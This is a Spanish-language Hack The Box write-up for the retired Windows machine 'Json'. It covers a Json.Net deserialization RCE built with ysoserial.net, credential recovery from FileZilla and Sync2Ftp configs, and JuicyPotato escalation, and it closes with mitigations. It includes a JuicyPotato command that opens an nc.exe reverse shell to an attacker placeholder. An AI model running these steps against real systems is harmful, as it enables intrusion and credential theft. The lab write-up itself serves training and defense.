---
machine: Json
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, dotnet, deserialization, juicypotato, privesc]
---

# Json — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web usa Angular y autentica con credenciales por defecto. El token OAuth2 es base64 de un JSON y el endpoint `/api/Account/` deserializa el Bearer con Json.Net. Un objeto de `ysoserial.net` con el gadget `WindowsIdentity` y formatter `Json.Net` ejecuta comandos como `userpool`. La configuración de FileZilla Server y Sync2Ftp filtra credenciales; además, `SeImpersonatePrivilege` permite JuicyPotato y una shell SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,445,5985 <IP>
```

- `80/tcp` IIS con una aplicación Angular y `445` SMB.
- El login usa `/api/token` y devuelve una cookie `OAuth2`.
- `/api/Account/` devuelve la información del usuario autenticado.

## Enumeración

- Las credenciales por defecto del panel funcionan.
- La cookie es base64 de `{"Id":1,"UserName":"admin","Password":"<MD5>","Role":"Administrator"}`.
- El Bearer se decodifica y se deserializa como objeto Json.Net; un base64 inválido revela el error.

## Foothold

Se genera un objeto con `ysoserial.net -g WindowsIdentity -f Json.Net -c "<COMMAND>" -o base64` y se envía como Bearer a `/api/Account/`. El servidor lo deserializa y ejecuta el comando como `json\userpool`.

```bash
ysoserial.exe -g WindowsIdentity -f Json.Net -c "whoami" -o base64
```

## Movimiento lateral

`userpool` puede leer la configuración de FileZilla Server en `C:\Program Files\FileZilla Server\FileZilla Server.xml`, que incluye el hash del administrador y el puerto 14147. También hay credenciales de Sync2Ftp cifradas con 3DES; con la `SecurityKey` se descifran y se accede al FTP como `superadmin`.

```python
from Crypto.Cipher import DES3
# clave = MD5(SecurityKey), modo ECB
```

## Escalada de privilegios

`whoami /priv` muestra `SeImpersonatePrivilege`. Al ser Windows Server 2012 R2, JuicyPotato funciona y permite ejecutar un binario como SYSTEM.

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe -e cmd.exe <ATTACKER> 443" -t *
```

## Evidencia

- Login `admin/admin` y cookie OAuth2 en base64.
- Error de deserialización Json.Net.
- Comando ejecutado con `ysoserial.net`.
- Configuración de FileZilla/Sync2Ftp y JuicyPotato como SYSTEM.

## Lecciones aprendidas

- Un token que se deserializa en servidor es una superficie de RCE.
- Los paneles de administración de servicios guardan credenciales recuperables.
- `SeImpersonatePrivilege` en versiones antiguas de Windows lleva a SYSTEM.

## Mitigación y detección

- No deserializar JSON con tipos arbitrarios; usar DTOs y allowlists.
- Proteger la configuración de FileZilla/Sync2Ftp y rotar credenciales.
- Aplicar least privilege y bloquear JuicyPotato/RoguePotato.

## Referencias

- [0xdf — Json](https://0xdf.gitlab.io/2020/02/15/htb-json.html)
- [IppSec — Json](https://www.youtube.com/watch?v=FPgK_udcBig)
- [Hack The Box — Json](https://app.hackthebox.com/machines/json)
